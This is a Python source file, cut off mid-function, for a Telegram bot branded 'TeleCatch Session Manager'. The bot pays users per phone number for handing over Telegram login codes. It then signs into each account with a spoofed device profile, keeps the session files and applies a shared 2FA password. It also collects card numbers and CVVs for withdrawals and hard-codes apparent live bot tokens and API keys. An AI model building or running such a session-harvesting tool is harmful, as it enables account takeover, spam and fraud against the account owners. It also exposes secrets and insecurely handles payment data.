import telebot
import sqlite3
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError, PeerFloodError
from telethon.tl import functions
import asyncio
import threading
import os
import phonenumbers
from phonenumbers import geocoder, country_code_for_region
import pycountry
from telebot import types
from telebot.util import escape
import time
import re
import datetime
import secrets
import string
import random
from collections import Counter
import zipfile
import shutil
import logging
import requests
import hashlib
import json
from typing import Dict, List, Optional, Tuple

# ==================== CONFIGURATION ====================
API_TOKEN = "8397203663:AAHePay7u3uqCAmh2AfSVXTnomMC5O6ZeQw"
ADMIN_ID = 6083895678  # Your Admin ID
API_ID = 25403443
API_HASH = "79908b532fe9662404142fd94bf494ec"

# Channel Configuration
PRIVATE_CHANNEL_LINK = "https://t.me/+9M4KaQILn7FhNDY1"
PRIVATE_CHANNEL_ID = -1002926608627
PUBLIC_CHANNEL_USERNAME = "@telecatch"

# Group IDs
SESSION_GROUP_ID = -1003084355923
WITHDRAW_GROUP_ID = -1002999572063
SPAM_BOT = "@spambot"

# Financial Configuration
MIN_WITHDRAW = 2.0
USD_TO_TRX = 2.78
USD_TO_BDT = 122.0
USD_TO_PKR = 278.5

# Database and Files
DB_FILE = "session_bot.db"
SESSIONS_FOLDER = "sessions"
PROXIES_CONFIG_FILE = "proxies.json"

# Security
MAX_PASSWORD_ATTEMPTS = 3
LOCKOUT_DURATION = 3600  # 1 hour in seconds

# Language Support
LANGUAGES = {
    'en': 'English 🇺🇸',
    'zh': '中文 🇨🇳', 
    'ar': 'العربية 🇦🇪'
}

DEFAULT_LANGUAGE = 'en'

# Create necessary directories
if not os.path.exists(SESSIONS_FOLDER):
    os.makedirs(SESSIONS_FOLDER)

# ==================== LOGGING SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ==================== MULTILANGUAGE SYSTEM ====================
class LanguageManager:
    translations = {
        'en': {
            'welcome': "🎉 Welcome to TeleCatch Session Manager\n\nUse commands to manage your sessions.",
            'balance': "💰 <b>Account Balance</b>\n\n👤 User ID: {user_id}\n✅ Verified Sessions: {verified}\n⏳ Pending Sessions: {pending}\n💵 Available Balance: ${balance:.2f}\n❄️ Frozen Balance: ${frozen:.2f}",
            'withdraw_method': "💳 <b>Select Withdrawal Method</b>\n\nBalance: ${balance:.2f}",
            'withdraw_ld': "💳 LD Card Withdrawal\n\nSend: Card Number|Expiry|CVV|Name",
            'withdraw_usdt': "💵 USDT (BEP20) Withdrawal\n\nSend your USDT address:",
            'frozen_account': "❄️ <b>Account Frozen</b>\n\nYour account has been frozen. Reason: {reason}\nContact administrator.",
            'session_created': "✅ <b>Session Created Successfully!</b>\n\n📱 Number: {phone}\nStatus: Active",
            'enter_phone': "📱 Please send your phone number with country code:\n\nExample: +1234567890",
            'enter_code': "🔐 Enter the 5-digit verification code:",
            'invalid_code': "❌ Invalid code format. Please enter 5 digits.",
            'withdraw_min': "❌ Minimum withdrawal is ${min:.2f}. Your balance: ${balance:.2f}",
            'withdraw_success': "✅ Withdrawal request submitted for ${amount:.2f}",
            'password_set': "🔐 Password set successfully!",
            'language_set': "🌍 Language set to {language}",
            'admin_panel': "👑 <b>Admin Panel</b>",
            'account_frozen_success': "❄️ Account {user_id} frozen. Reason: {reason}",
            'account_unfrozen_success': "✅ Account {user_id} unfrozen",
            'country_added': "✅ Country {country_code} added successfully",
            'country_updated': "✅ Country {country_code} updated successfully",
            'country_removed': "✅ Country {country_code} removed successfully",
            'broadcast_started': "📢 Broadcast started...",
            'broadcast_complete': "📢 Broadcast completed\n✅ Sent: {success}\n❌ Failed: {fail}",
            '2fa_updated': "🔐 2FA password updated to: {password}"
        },
        'zh': {
            'welcome': "🎉 欢迎使用 TeleCatch 会话管理器\n\n使用命令管理您的会话。",
            'balance': "💰 <b>账户余额</b>\n\n👤 用户ID: {user_id}\n✅ 已验证会话: {verified}\n⏳ 待处理会话: {pending}\n💵 可用余额: ${balance:.2f}\n❄️ 冻结余额: ${frozen:.2f}",
            'withdraw_method': "💳 <b>选择提款方式</b>\n\n余额: ${balance:.2f}",
            'withdraw_ld': "💳 LD卡提款\n\n发送: 卡号|有效期|CVV|姓名",
            'withdraw_usdt': "💵 USDT (BEP20) 提款\n\n发送您的USDT地址:",
            'frozen_account': "❄️ <b>账户已冻结</b>\n\n您的账户已被冻结。原因: {reason}\n请联系管理员。",
            'session_created': "✅ <b>会话创建成功!</b>\n\n📱 号码: {phone}\n状态: 活跃",
            'enter_phone': "📱 请发送带有国家代码的电话号码:\n\n例如: +1234567890",
            'enter_code': "🔐 输入5位验证码:",
            'invalid_code': "❌ 验证码格式错误。请输入5位数字。",
            'withdraw_min': "❌ 最低提款额为 ${min:.2f}。您的余额: ${balance:.2f}",
            'withdraw_success': "✅ 已提交 ${amount:.2f} 的提款请求",
            'password_set': "🔐 密码设置成功!",
            'language_set': "🌍 语言已设置为 {language}",
            'admin_panel': "👑 <b>管理员面板</b>",
            'account_frozen_success': "❄️ 账户 {user_id} 已冻结。原因: {reason}",
            'account_unfrozen_success': "✅ 账户 {user_id} 已解冻",
            'country_added': "✅ 国家 {country_code} 添加成功",
            'country_updated': "✅ 国家 {country_code} 更新成功",
            'country_removed': "✅ 国家 {country_code} 删除成功",
            'broadcast_started': "📢 广播开始...",
            'broadcast_complete': "📢 广播完成\n✅ 发送成功: {success}\n❌ 发送失败: {fail}",
            '2fa_updated': "🔐 2FA密码已更新为: {password}"
        },
        'ar': {
            'welcome': "🎉 مرحبًا بك في مدير جلسات TeleCatch\n\nاستخدم الأوامر لإدارة جلساتك.",
            'balance': "💰 <b>رصيد الحساب</b>\n\n👤 رقم المستخدم: {user_id}\n✅ الجلسات المؤكدة: {verified}\n⏳ الجلسات قيد الانتظار: {pending}\n💵 الرصيد المتاح: ${balance:.2f}\n❄️ الرصيد المجمد: ${frozen:.2f}",
            'withdraw_method': "💳 <b>اختر طريقة السحب</b>\n\nالرصيد: ${balance:.2f}",
            'withdraw_ld': "💳 سحب بطاقة LD\n\nأرسل: رقم البطاقة|انتهاء الصلاحية|CVV|الاسم",
            'withdraw_usdt': "💵 سحب USDT (BEP20)\n\nأرسل عنوان USDT الخاص بك:",
            'frozen_account': "❄️ <b>الحساب مجمد</b>\n\nتم تجميد حسابك. السبب: {reason}\nيرجى الاتصال بالإدارة.",
            'session_created': "✅ <b>تم إنشاء الجلسة بنجاح!</b>\n\n📱 الرقم: {phone}\nالحالة: نشط",
            'enter_phone': "📱 يرجى إرسال رقم هاتفك مع رمز الدولة:\n\nمثال: +1234567890",
            'enter_code': "🔐 أدخل رمز التحقق المكون من 5 أرقام:",
            'invalid_code': "❌ تنسيق الرمز غير صالح. يرجى إدخال 5 أرقام.",
            'withdraw_min': "❌ الحد الأدنى للسحب هو ${min:.2f}. رصيدك: ${balance:.2f}",
            'withdraw_success': "✅ تم تقديم طلب سحب بقيمة ${amount:.2f}",
            'password_set': "🔐 تم تعيين كلمة المرور بنجاح!",
            'language_set': "🌍 تم تعيين اللغة إلى {language}",
            'admin_panel': "👑 <b>لوحة الإدارة</b>",
            'account_frozen_success': "❄️ تم تجميد الحساب {user_id}. السبب: {reason}",
            'account_unfrozen_success': "✅ تم فك تجميد الحساب {user_id}",
            'country_added': "✅ تمت إضافة الدولة {country_code} بنجاح",
            'country_updated': "✅ تم تحديث الدولة {country_code} بنجاح",
            'country_removed': "✅ تمت إزالة الدولة {country_code} بنجاح",
            'broadcast_started': "📢 بدأ البث...",
            'broadcast_complete': "📢 اكتمل البث\n✅ تم الإرسال: {success}\n❌ فشل الإرسال: {fail}",
            '2fa_updated': "🔐 تم تحديث كلمة مرور 2FA إلى: {password}"
        }
    }

    @staticmethod
    def get_text(key: str, language: str = 'en', **kwargs) -> str:
        """Get translated text with formatting"""
        text = LanguageManager.translations.get(language, {}).get(key, key)
        return text.format(**kwargs) if kwargs else text

    @staticmethod
    def get_user_language(user_id: int) -> str:
        """Get user's preferred language"""
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT language FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        conn.close()
        return result[0] if result else DEFAULT_LANGUAGE

    @staticmethod
    def set_user_language(user_id: int, language: str):
        """Set user's preferred language"""
        if language in LANGUAGES:
            conn = sqlite3.connect(DB_FILE, check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute("UPDATE users SET language = ? WHERE user_id = ?", (language, user_id))
            conn.commit()
            conn.close()

# ==================== DATABASE MANAGEMENT ====================
def init_db():
    """Initialize database with frozen account support"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    
    # Enhanced users table with frozen account support
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            full_name TEXT,
            balance REAL DEFAULT 0,
            frozen_balance REAL DEFAULT 0,
            session_count INTEGER DEFAULT 0,
            verified_count INTEGER DEFAULT 0,
            unverified_count INTEGER DEFAULT 0,
            claimed_numbers TEXT DEFAULT "",
            pending_numbers TEXT DEFAULT "",
            join_date TEXT,
            language TEXT DEFAULT 'en',
            withdraw_password TEXT,
            password_attempts INTEGER DEFAULT 0,
            account_locked INTEGER DEFAULT 0,
            account_frozen INTEGER DEFAULT 0,
            lock_until INTEGER DEFAULT 0,
            frozen_reason TEXT DEFAULT ""
        )
    """)
    
    # Country rates table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS country_rates (
            country_code TEXT PRIMARY KEY,
            country_name TEXT,
            rate REAL NOT NULL,
            claim_time_seconds INTEGER NOT NULL,
            status TEXT NOT NULL DEFAULT "on",
            capacity INTEGER NOT NULL DEFAULT 10,
            usage_count INTEGER NOT NULL DEFAULT 0
        )
    """)
    
    # Used numbers table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS used_numbers (
            phone_number TEXT PRIMARY KEY,
            user_id INTEGER NOT NULL
        )
    """)
    
    # Enhanced withdraw history
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS withdraw_history (
            withdraw_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            amount REAL NOT NULL,
            address TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            trans_no TEXT,
            transaction_id TEXT,
            currency TEXT,
            status TEXT DEFAULT 'pending',
            admin_notes TEXT
        )
    """)
    
    # Admins table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS admins (
            user_id INTEGER PRIMARY KEY,
            role TEXT DEFAULT 'admin'
        )
    """)
    
    # Settings table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    
    # User sessions table for tracking
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_sessions (
            session_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            phone_number TEXT NOT NULL,
            country_code TEXT,
            status TEXT DEFAULT 'pending',
            created_at TEXT,
            completed_at TEXT
        )
    """)
    
    # Insert default data
    cursor.execute("INSERT OR IGNORE INTO admins (user_id, role) VALUES (?, ?)", (ADMIN_ID, 'superadmin'))
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('withdraw_status', 'on')")
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('2fa_status', 'on')")
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('2fa_password', 'TeleCatch2024!')")
    
    # Insert default country rates
    default_rates = [
        ("BD", "Bangladesh", 10.0, 30, "on", 20, 0),
        ("SA", "Saudi Arabia", 20.0, 60, "on", 15, 0),
        ("IN", "India", 8.0, 20, "on", 25, 0),
        ("US", "United States", 25.0, 45, "on", 10, 0),
        ("TG", "Telegram", 15.0, 40, "on", 15, 0)
    ]
    
    for rate in default_rates:
        cursor.execute("INSERT OR IGNORE INTO country_rates VALUES (?, ?, ?, ?, ?, ?, ?)", rate)
    
    conn.commit()
    conn.close()
    logger.info("Database initialized successfully")

def migrate_db():
    """Safe database migration"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        
        # Check and add new columns to users table
        columns_to_add = [
            ('language', 'TEXT DEFAULT "en"'),
            ('withdraw_password', 'TEXT'),
            ('password_attempts', 'INTEGER DEFAULT 0'),
            ('account_locked', 'INTEGER DEFAULT 0'),
            ('lock_until', 'INTEGER DEFAULT 0'),
            ('account_frozen', 'INTEGER DEFAULT 0'),
            ('frozen_balance', 'REAL DEFAULT 0'),
            ('frozen_reason', 'TEXT DEFAULT ""')
        ]
        
        cursor.execute("PRAGMA table_info(users)")
        existing_columns = [col[1] for col in cursor.fetchall()]
        
        for col_name, col_type in columns_to_add:
            if col_name not in existing_columns:
                cursor.execute(f"ALTER TABLE users ADD COLUMN {col_name} {col_type}")
                logger.info(f"Added column {col_name} to users table")
        
        # Check country_rates table for country_name column
        cursor.execute("PRAGMA table_info(country_rates)")
        country_columns = [col[1] for col in cursor.fetchall()]
        if 'country_name' not in country_columns:
            cursor.execute("ALTER TABLE country_rates ADD COLUMN country_name TEXT")
        
        conn.commit()
        conn.close()
        logger.info("Database migration completed successfully")
        
    except Exception as e:
        logger.error(f"Migration error: {e}")

# Initialize database
init_db()
migrate_db()

# ==================== BOT INITIALIZATION ====================
bot = telebot.TeleBot(API_TOKEN, parse_mode='HTML')
user_data = {}

# ==================== SECURITY FUNCTIONS ====================
def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM admins WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

def is_account_frozen(user_id: int) -> Tuple[bool, str]:
    """Check if account is frozen and return reason"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT account_frozen, frozen_reason FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result and result[0] == 1:
        return True, result[1] or "No reason provided"
    return False, ""

def freeze_account(user_id: int, reason: str = ""):
    """Freeze user account and move balance to frozen"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    
    if result:
        current_balance = result[0]
        cursor.execute("""
            UPDATE users 
            SET account_frozen = 1, frozen_reason = ?, frozen_balance = ?, balance = 0 
            WHERE user_id = ?
        """, (reason, current_balance, user_id))
    
    conn.commit()
    conn.close()

def unfreeze_account(user_id: int):
    """Unfreeze user account and restore balance"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute("SELECT frozen_balance FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    
    if result:
        frozen_balance = result[0]
        cursor.execute("""
            UPDATE users 
            SET account_frozen = 0, frozen_reason = '', balance = ?, frozen_balance = 0 
            WHERE user_id = ?
        """, (frozen_balance, user_id))
    
    conn.commit()
    conn.close()

def check_account_lock(user_id: int) -> Tuple[bool, str]:
    """Check if account is locked due to password attempts"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT account_locked, lock_until FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        return False, ""
    
    locked, lock_until = result
    if locked and lock_until > time.time():
        remaining = int(lock_until - time.time())
        return True, f"Account locked. Please try again in {remaining//60} minutes."
    
    # Reset if lock expired
    if locked:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET account_locked = 0, password_attempts = 0 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
    
    return False, ""

def verify_withdraw_password(user_id: int, password: str) -> Tuple[bool, str]:
    """Verify withdraw password with attempt tracking"""
    # Check account lock first
    locked, message = check_account_lock(user_id)
    if locked:
        return False, message
    
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT withdraw_password, password_attempts FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    
    if not result or not result[0]:
        conn.close()
        return False, "Withdraw password not set. Please use /setpassword first."
    
    stored_password, attempts = result
    
    if PasswordManager.verify_password(password, stored_password):
        # Reset attempts on success
        cursor.execute("UPDATE users SET password_attempts = 0 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        return True, "Password verified successfully."
    else:
        # Increment attempts
        new_attempts = attempts + 1
        cursor.execute("UPDATE users SET password_attempts = ? WHERE user_id = ?", (new_attempts, user_id))
        
        if new_attempts >= MAX_PASSWORD_ATTEMPTS:
            lock_until = time.time() + LOCKOUT_DURATION
            cursor.execute("UPDATE users SET account_locked = 1, lock_until = ? WHERE user_id = ?", (lock_until, user_id))
            conn.commit()
            conn.close()
            return False, f"Too many failed attempts. Account locked for {LOCKOUT_DURATION//60} minutes."
        
        conn.commit()
        conn.close()
        remaining = MAX_PASSWORD_ATTEMPTS - new_attempts
        return False, f"Invalid password. {remaining} attempts remaining."

def set_withdraw_password(user_id: int, password: str) -> bool:
    """Set withdraw password for user"""
    hashed_password = PasswordManager.hash_password(password)
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET withdraw_password = ?, password_attempts = 0, account_locked = 0 WHERE user_id = ?", 
                   (hashed_password, user_id))
    conn.commit()
    conn.close()
    return True

# ==================== PASSWORD SECURITY ====================
class PasswordManager:
    @staticmethod
    def hash_password(password: str) -> str:
        """Hash password using SHA-256"""
        return hashlib.sha256(password.encode()).hexdigest()
    
    @staticmethod
    def verify_password(plain_password: str, hashed_password: str) -> bool:
        """Verify password against hash"""
        return PasswordManager.hash_password(plain_password) == hashed_password
    
    @staticmethod
    def generate_random_password(length: int = 8) -> str:
        """Generate random password"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

# ==================== SESSION FILE MANAGEMENT ====================
def create_session_zip(user_id: int, phone_number: str) -> Optional[str]:
    """Create zip file for session"""
    try:
        zip_filename = f"{SESSIONS_FOLDER}/{user_id}_{phone_number}.zip"
        session_file = f"{SESSIONS_FOLDER}/{user_id}_{phone_number}.session"
        
        if os.path.exists(session_file):
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(session_file, os.path.basename(session_file))
            return zip_filename
        return None
    except Exception as e:
        logger.error(f"Error creating zip: {e}")
        return None

# ==================== UTILITY FUNCTIONS ====================
def get_country_info(phone_number: str) -> Dict:
    """Get country information from phone number"""
    try:
        parsed_number = phonenumbers.parse(phone_number)
        country_code = geocoder.region_code_for_number(parsed_number)
        dial_code = parsed_number.country_code
        return {"code": country_code, "dial_code": dial_code, "valid": True}
    except Exception as e:
        logger.error(f"Phone number parsing error: {e}")
        return {"code": None, "dial_code": None, "valid": False}

def get_country_flag(country_code: str) -> str:
    """Get country flag emoji from country code"""
    if not country_code:
        return "🌍"
    try:
        return "".join(chr(ord(c) + 127397) for c in country_code.upper())
    except:
        return "🌍"

def generate_device_info():
    """Generate random device information"""
    devices = [
        {"model": "iPhone 14 Pro", "version": "iOS 17.1", "app": "10.5.5"},
        {"model": "Samsung Galaxy S23", "version": "Android 14", "app": "10.5.5"},
        {"model": "Google Pixel 7", "version": "Android 14", "app": "10.5.5"},
        {"model": "Xiaomi 13", "version": "Android 13", "app": "10.5.5"}
    ]
    device = random.choice(devices)
    return {
        "device_model": device["model"],
        "system_version": device["version"],
        "app_version": device["app"],
        "lang_code": "en"
    }

def generate_transaction_id() -> str:
    """Generate unique transaction ID"""
    return f"TC{int(time.time())}{random.randint(1000, 9999)}"

# ==================== COUNTRY MANAGEMENT FUNCTIONS ====================
def add_country(country_code: str, country_name: str, rate: float, claim_time: int, capacity: int, status: str = "on") -> bool:
    """Add new country to database"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("""
            INSERT OR REPLACE INTO country_rates 
            (country_code, country_name, rate, claim_time_seconds, status, capacity, usage_count)
            VALUES (?, ?, ?, ?, ?, ?, 0)
        """, (country_code, country_name, rate, claim_time, status, capacity))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"Error adding country: {e}")
        return False

def update_country(country_code: str, **kwargs) -> bool:
    """Update country information"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        
        valid_fields = ['rate', 'claim_time_seconds', 'status', 'capacity', 'country_name']
        updates = []
        values = []
        
        for field, value in kwargs.items():
            if field in valid_fields:
                updates.append(f"{field} = ?")
                values.append(value)
        
        if updates:
            values.append(country_code)
            query = f"UPDATE country_rates SET {', '.join(updates)} WHERE country_code = ?"
            cursor.execute(query, values)
            conn.commit()
        
        conn.close()
        return True
    except Exception as e:
        logger.error(f"Error updating country: {e}")
        return False

def remove_country(country_code: str) -> bool:
    """Remove country from database"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM country_rates WHERE country_code = ?", (country_code,))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"Error removing country: {e}")
        return False

def get_country_info_by_code(country_code: str) -> Optional[Dict]:
    """Get country information by code"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM country_rates WHERE country_code = ?", (country_code,))
        result = cursor.fetchone()
        conn.close()
        
        if result:
            return {
                'country_code': result[0],
                'country_name': result[1],
                'rate': result[2],
                'claim_time_seconds': result[3],
                'status': result[4],
                'capacity': result[5],
                'usage_count': result[6]
            }
        return None
    except Exception as e:
        logger.error(f"Error getting country info: {e}")
        return None

# ==================== ADMIN BROADCAST FUNCTION ====================
def admin_process_broadcast(message):
    """Process broadcast message to all users"""
    bot.send_message(message.chat.id, "⏳ Broadcast starting...")
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    users = cursor.execute("SELECT user_id FROM users").fetchall()
    conn.close()
    
    success, fail = 0, 0
    for user in users:
        try:
            bot.copy_message(user[0], message.chat.id, message.message_id)
            success += 1
        except Exception as e:
            fail += 1
        time.sleep(0.05)  # Rate limiting
    
    report = f"📢 Broadcast Report\n✅ Sent: {success}\n❌ Failed: {fail}"
    bot.send_message(message.chat.id, report)
    
    # Clean up user data
    if message.chat.id in user_data:
        del user_data[message.chat.id]

def admin_process_change_2fa_password(message):
    """Process 2FA password change"""
    new_password = message.text.strip()
    if not new_password:
        bot.reply_to(message, "❌ Invalid password. Please provide a valid password.")
        return
    
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("REPLACE INTO settings (key, value) VALUES ('2fa_password', ?)", (new_password,))
    conn.commit()
    conn.close()
    
    bot.reply_to(message, f"✅ 2FA password changed to `{new_password}`.", parse_mode="Markdown")
    
    # Clean up user data
    if message.chat.id in user_data:
        del user_data[message.chat.id]

# ==================== CHANNEL VERIFICATION ====================
def check_channel_membership(user_id: int) -> bool:
    """Check if user is member of required channels"""
    try:
        # Check private channel
        try:
            member_private = bot.get_chat_member(PRIVATE_CHANNEL_ID, user_id)
            if member_private.status not in ['member', 'administrator', 'creator']:
                return False
        except:
            return False
        
        # Check public channel
        try:
            member_public = bot.get_chat_member(PUBLIC_CHANNEL_USERNAME, user_id)
            if member_public.status not in ['member', 'administrator', 'creator']:
                return False
        except:
            return False
        
        return True
    except Exception as e:
        logger.error(f"Channel check error: {e}")
        return False

def send_channel_join_message(chat_id: int):
    """Send channel join requirement message"""
    message = """
🚀 Welcome to TeleCatch Session Manager

To access all features, you need to join our channels:

• Private Channel: {}
• Public Channel: @{}

After joining both channels, send /start again.
    """.format(PRIVATE_CHANNEL_LINK, PUBLIC_CHANNEL_USERNAME[1:])
    
    bot.send_message(chat_id, message)

# ==================== TELEGRAM CLIENT FUNCTIONS ====================
async def create_telegram_client(phone_number: str, session_path: str):
    """Create Telegram client"""
    device_info = generate_device_info()
    
    return TelegramClient(
        session_path, 
        API_ID, 
        API_HASH,
        device_model=device_info["device_model"],
        system_version=device_info["system_version"],
        app_version=device_info["app_version"],
        lang_code=device_info["lang_code"]
    )

async def send_verification_code(chat_id: int, phone_number: str, message_id: int):
    """Send verification code to phone number"""
    try:
        session_filename = f"{SESSIONS_FOLDER}/{chat_id}_{phone_number}.session"
        client = await create_telegram_client(phone_number, session_filename)
        await client.connect()
        
        sent_code = await client.send_code_request(phone_number)
        
        # Store user data
        user_data[chat_id] = {
            "phone": phone_number,
            "phone_code_hash": sent_code.phone_code_hash,
            "session_file": session_filename,
            "state": "awaiting_code",
            "message_id": message_id
        }
        
        # Update database
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET unverified_count = unverified_count + 1 WHERE user_id = ?", (chat_id,))
        conn.commit()
        conn.close()
        
        country_info = get_country_info(phone_number)
        flag = get_country_flag(country_info.get('code'))
        
        message = f"""
{flag} Verification Code Sent

📱 Phone Number: {phone_number}
🔐 Status: Code sent successfully

Please enter the 5-digit verification code you received.

Type /cancel to cancel this operation.
        """
        
        bot.edit_message_text(message, chat_id, message_id)
        
    except Exception as e:
        logger.error(f"Error sending verification code: {e}")
        bot.edit_message_text(f"❌ Error sending code: {str(e)}", chat_id, message_id)
        if chat_id in user_data:
            del user_data[chat_id]

async def verify_code_and_create_session(chat_id: int, code: str):
    """Verify code and create session"""
    if chat_id not in user_data:
        return False, "Session expired. Please start again."
    
    data = user_data[chat_id]
    phone_number = data["phone"]
    
    try:
        client = await create_telegram_client(phone_number, data["session_file"])
        await client.connect()
        
        # Sign in with code
        await client.sign_in(phone_number, code, phone_code_hash=data["phone_code_hash"])
        
        # Check if 2FA is required
        if await client.is_user_authorized():
            # Process successful login
            await process_successful_session(client, chat_id, phone_number)
            return True, "Session created successfully!"
        else:
            return False, "Authentication failed. Please try again."
            
    except PhoneCodeInvalidError:
        return False, "Invalid verification code. Please check and try again."
    except PhoneCodeExpiredError:
        return False, "Verification code has expired. Please request a new code."
    except SessionPasswordNeededError:
        return False, "This account has 2FA enabled. Please disable it and try again."
    except Exception as e:
        logger.error(f"Session creation error: {e}")
        return False, f"Error: {str(e)}"

async def process_successful_session(client, chat_id: int, phone_number: str):
    """Process successful session creation"""
    try:
        # Get country info for rate calculation
        country_info = get_country_info(phone_number)
        country_code = country_info.get('code')
        
        # Get rate from database
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        
        if country_code:
            cursor.execute("SELECT rate, claim_time_seconds FROM country_rates WHERE country_code = ? AND status = 'on'", (country_code,))
            rate_info = cursor.fetchone()
        else:
            rate_info = None
        
        if rate_info:
            rate, claim_time = rate_info
            # Start auto-claim process
            threading.Timer(claim_time, lambda: run_async(auto_claim_session(chat_id, phone_number, rate))).start()
        
        # Update user statistics
        cursor.execute("""
            UPDATE users 
            SET verified_count = verified_count + 1, 
                unverified_count = unverified_count - 1 
            WHERE user_id = ?
        """, (chat_id,))
        conn.commit()
        conn.close()
        
        # Save session file and create zip
        session_path = os.path.join(SESSIONS_FOLDER, f"{phone_number}.session")
        if os.path.exists(user_data[chat_id]["session_file"]):
            shutil.copy(user_data[chat_id]["session_file"], session_path)
        
        # Create and send zip file
        zip_file = create_session_zip(chat_id, phone_number)
        
        # Send success message
        language = LanguageManager.get_user_language(chat_id)
        message = LanguageManager.get_text('session_created', language, phone=phone_number)
        
        bot.edit_message_text(message, chat_id, user_data[chat_id]["message_id"])
        
        # Send zip file if created
        if zip_file:
            with open(zip_file, 'rb') as f:
                bot.send_document(chat_id, f, caption="📦 Your session file")
            os.remove(zip_file)
        
    except Exception as e:
        logger.error(f"Session processing error: {e}")

async def auto_claim_session(user_id: int, phone_number: str, amount: float):
    """Auto-claim balance after confirmation period"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        
        # Check if account is frozen
        cursor.execute("SELECT account_frozen FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        
        if result and result[0] == 1:
            logger.info(f"Account {user_id} is frozen, skipping balance addition")
            conn.close()
            return
        
        # Add balance to user
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        
        # Add to claimed numbers
        cursor.execute("SELECT claimed_numbers FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        claimed_numbers = result[0] if result else ""
        new_claimed = f"{claimed_numbers},{phone_number}" if claimed_numbers else phone_number
        cursor.execute("UPDATE users SET claimed_numbers = ? WHERE user_id = ?", (new_claimed, user_id))
        
        # Update country usage
        country_info = get_country_info(phone_number)
        if country_info.get('code'):
            cursor.execute("UPDATE country_rates SET usage_count = usage_count + 1 WHERE country_code = ?", (country_info['code'],))
        
        conn.commit()
        conn.close()
        
        # Send notification to user
        language = LanguageManager.get_user_language(user_id)
        message = f"""
💰 Balance Added!

📱 Phone Number: {phone_number}
💵 Amount Added: ${amount:.2f}
✅ Status: Successfully claimed

Your balance has been updated. Check with /account
        """
        
        bot.send_message(user_id, message)
        
    except Exception as e:
        logger.error(f"Auto-claim error: {e}")

def run_async(async_func):
    """Run async function in thread"""
    loop = asyncio.new_event_loop()
